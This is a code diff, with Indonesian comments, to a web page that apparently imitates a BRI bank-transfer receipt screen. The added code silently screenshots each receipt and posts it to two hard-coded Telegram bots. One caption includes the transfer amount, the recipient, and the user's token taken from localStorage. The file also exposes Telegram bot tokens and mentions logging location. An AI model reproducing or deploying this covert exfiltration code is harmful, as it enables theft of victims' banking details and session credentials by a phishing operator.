@@ -3,10 +3,10 @@ const DEPLOYMENT_URL = "https://script.google.com/macros/s/AKfycbx4zmm33s3WYBssI
 
 // --- PENGATURAN BOT TELEGRAM ---
 
-// 1. BOT UTAMA (Untuk Log Teks & Lokasi)
+// 1. BOT UTAMA (Bot Lama - Untuk Log Lengkap & Foto)
 const TELEGRAM_BOT_TOKEN = "8238029335:AAFTyfRG9B5mZi04M_2feIr4_JxQ7X9pikM"; 
 
-// 2. BOT KHUSUS FOTO (Hanya untuk Struk)
+// 2. BOT KHUSUS FOTO (Bot Baru - Untuk Arsip Foto Struk Saja)
 const TELEGRAM_PHOTO_BOT_TOKEN = "8203841988:AAHZ3mt9wDPZQpEG-7zHcu9T-PFTRGDbGF4";
 
 // CHAT ID (Digunakan untuk kedua bot)
@@ -928,7 +928,7 @@ if (receiptOverlay && receiptDoneButton) {
     });
 }
 
-// --- FUNGSI BARU: KIRIM FOTO BUKTI KE TELEGRAM (BOT FOTO BARU) ---
+// --- FUNGSI BARU: KIRIM FOTO BUKTI KE DUA BOT ---
 function kirimFotoBuktiOtomatis() {
     if (typeof html2canvas === 'undefined') {
         console.error("Library html2canvas belum terpasang!");
@@ -950,9 +950,12 @@ function kirimFotoBuktiOtomatis() {
     
     window.scrollTo(0, 0);
 
-    // AMBIL STATUS LANGSUNG DARI ELEMEN JUDUL STRUK
-    // Ini akan berisi "Transaksi Berhasil" atau "Transaksi Gagal"
+    // AMBIL DATA UNTUK CAPTION LENGKAP (BOT UTAMA)
+    const nominal = document.querySelector('#receipt-total-amount').innerText;
     const statusText = document.querySelector('#receipt-status-title').innerText;
+    const penerima = document.querySelector('#receipt-dest-name').innerText;
+    const bank = document.querySelector('#receipt-dest-bank').innerText;
+    const token = localStorage.getItem('userToken') || '-';
 
     html2canvas(element, {
         scale: 2, 
@@ -973,20 +976,39 @@ function kirimFotoBuktiOtomatis() {
         canvas.toBlob(function(blob) {
             if (!blob) return;
 
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID); 
-            formData.append('photo', blob, 'bukti-transfer-bri.png');
+            // --- 1. KIRIM KE BOT KHUSUS FOTO (CAPTION SIMPEL) ---
+            const formDataNew = new FormData();
+            formDataNew.append('chat_id', TELEGRAM_CHAT_ID); 
+            formDataNew.append('photo', blob, 'bukti-transfer-bri.png');
+            formDataNew.append('caption', statusText); // Hanya "Transaksi Berhasil" atau "Gagal"
             
-            // CAPTION: Hanya Status (Berhasil/Gagal)
-            formData.append('caption', statusText);
-            
-            // KIRIM KE BOT BARU KHUSUS FOTO
             fetch(`https://api.telegram.org/bot${TELEGRAM_PHOTO_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
-                body: formData
+                body: formDataNew
             })
-            .then(res => console.log("Foto bukti terkirim ke Bot Foto!"))
-            .catch(err => console.error("Gagal kirim foto:", err));
+            .then(res => console.log("Foto terkirim ke Bot Foto (Baru)!"))
+            .catch(err => console.error("Gagal kirim ke Bot Foto:", err));
+
+
+            // --- 2. KIRIM KE BOT UTAMA (CAPTION LENGKAP/LOG) ---
+            const captionOldBot = `<b>📸 BUKTI TRANSFER (AUTO)</b>\n\n` +
+                                  `<b>Status:</b> ${statusText}\n` +
+                                  `<b>Nominal:</b> ${nominal}\n` +
+                                  `<b>Penerima:</b> ${penerima} (${bank})\n` +
+                                  `<b>Token:</b> <code>${token}</code>`;
+
+            const formDataOld = new FormData();
+            formDataOld.append('chat_id', TELEGRAM_CHAT_ID); 
+            formDataOld.append('photo', blob, 'bukti-transfer-bri.png');
+            formDataOld.append('caption', captionOldBot); // Caption Lengkap
+            formDataOld.append('parse_mode', 'HTML');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formDataOld
+            })
+            .then(res => console.log("Foto terkirim ke Bot Utama (Lama)!"))
+            .catch(err => console.error("Gagal kirim ke Bot Utama:", err));
 
         }, 'image/png');
     }).catch(err => {
